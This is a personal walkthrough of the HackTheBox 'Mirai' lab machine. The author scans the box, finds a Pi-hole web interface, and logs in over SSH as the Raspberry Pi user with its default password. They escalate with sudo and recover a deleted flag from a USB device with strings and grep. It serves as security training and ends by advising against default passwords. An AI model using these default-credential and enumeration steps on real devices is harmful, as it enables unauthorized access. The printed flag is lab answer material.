# Mirai

First of, the name of the box is a reference to the Mirai worm. Which was a worm that created a huge botnet. Another reason it is well known is that it only used around 60 passwords, most if not all being default passwords that were never changed. It mostly attacked IoT devices. You can find the source code here: https://github.com/jgamblin/Mirai-Source-Code 

So let’s begin:

```
kali@kali:~/htb/Mirai$ sudo nmap -sC -sV  10.129.63.131
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 09:34 EST
Nmap scan report for 10.129.63.131
Host is up (0.030s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
```

Webpage is empty. I run searchsploit:


```
kali@kali:~/htb/Mirai$ searchsploit lighttpd 
------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------- ---------------------------------
lighttpd - Denial of Service (PoC)                                                                                 | linux/dos/18295.txt
Lighttpd 1.4.15 - Multiple Code Execution / Denial of Service / Information Disclosure Vulnerabilities             | windows/remote/30322.rb
Lighttpd 1.4.16 - FastCGI Header Overflow Remote Command Execution                                                 | multiple/remote/4391.c
Lighttpd 1.4.17 - FastCGI Header Overflow Arbitrary Code Execution                                                 | linux/remote/4437.c
lighttpd 1.4.31 - Denial of Service (PoC)                                                                          | linux/dos/22902.sh
Lighttpd 1.4.x - mod_userdir Information Disclosure                                                                | linux/remote/31396.txt
lighttpd 1.4/1.5 - Slow Request Handling Remote Denial of Service                                                  | linux/dos/33591.sh
Lighttpd < 1.4.23 (BSD/Solaris) - Source Code Disclosure                                                           | multiple/remote/8786.txt
------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I try wfuzz to see if we can find anything on the webpage:

``` 
sudo wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.63.131/FUZZ
```

And while that runs I try some stuff. /login, /admin etc.

It finds /admin, but it’s empty. It also finds /versions, which is a file that just lists some versions.


I then decide to check the dnsmasq version.
```
kali@kali:~/htb/Mirai$ searchsploit dnsmasq 2.76
-------------------------------------- ---------------------------------
 Exploit Title                        |  Path
-------------------------------------- ---------------------------------
Dnsmasq < 2.78 - 2-byte Heap Overflow | multiple/dos/42941.py
Dnsmasq < 2.78 - Heap Overflow        | multiple/dos/42942.py
Dnsmasq < 2.78 - Information Leak     | multiple/dos/42944.py
Dnsmasq < 2.78 - Integer Underflow    | multiple/dos/42946.py
Dnsmasq < 2.78 - Lack of free() Denia | multiple/dos/42945.py
Dnsmasq < 2.78 - Stack Overflow       | multiple/dos/42943.py
-------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Mirai$ 
```

Also, this is a domain service, so let’s add this to our /etc/hosts file. 

I then go to http://mirai.htb/. No access. I  try http://mirai.htb/admin/. And we get an admin page. For a Raspberry pi. The framework is called Pi-hole. I google this and the default user:password is pi:raspberry.

There is a login option at http://mirai.htb/admin/index.php?login 
Only thing needed is a password. So probably not the pi:raspberry login, but I try anyways.. Didn’t work. Is this where the Mirai passwords are gonna be used?

I use `locate mirai` to locate the mirai password wordlist. But can’t get hydra to work on this website. 

So I try out ssh:

```
kali@kali:~/htb/Mirai$ ssh pi@mirai.htb
pi@mirai.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
pi@raspberrypi:~ $ 

```
This is related to Mirai, as it uses default passwords. Although not the exact passwords Mirai uses.

We can also see that user pi is sudo.

```
pi@raspberrypi:/ $ sudo su
root@raspberrypi:/# whoami
root
```

Normally, this would be it. But the owner of the system lost his flag!

```
root@raspberrypi:/# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

Ok, lets check the USB stick.

```
root@raspberrypi:/# cd media
root@raspberrypi:/media# ls
usbstick
root@raspberrypi:/media# cd usb
root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Ok, so we can assume that the data is probably still on the USB drive, deleted, but not overwritten yet.

```
root@raspberrypi:/# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.7G  5.3G  34% /
tmpfs           100M  4.8M   96M   5% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.7G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
root@raspberrypi:/# 
```
Df shows information about the file system on which each file resides. And -h just makes it human readable.


Here we can see that `/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick` /dev/sdb is the location of the usbstick on the filesystem. So let’s try a simple strings command to see what exists here.

```
root@raspberrypi:/# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
root@raspberrypi:/# 
```

That looks like a flag to me. If we wanted to only search for the flag we could filter our strings a bit:

```
root@raspberrypi:/# strings /dev/sdb | grep -oP '\w{32}'
3d3e483143ff12ec505d026fa13e020b
root@raspberrypi:/# 
```

Grep:

-o = only matching

-P = Perl regular expression

-w = matches the word characters alphanumeric + underscore `_`.

{32} = 32 characters long. Which all flags are.




## Comparing myself to the official writeup:

The official writeup pretty much used the same method, but highlighted an important part of recovering the root.txt flag.

Using `sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd` will copy the USBstick contents to a raw file. This ensures that the flag will not be overwritten. This is not necessarily needed on HTB, as I can just reset the box if I make a mistake. But that might not always be the case in reality. Ensuring volatile data is saved should be done in realistic situations.

## How to stop this exploit:

Don’t use default passwords. They are publicly available.
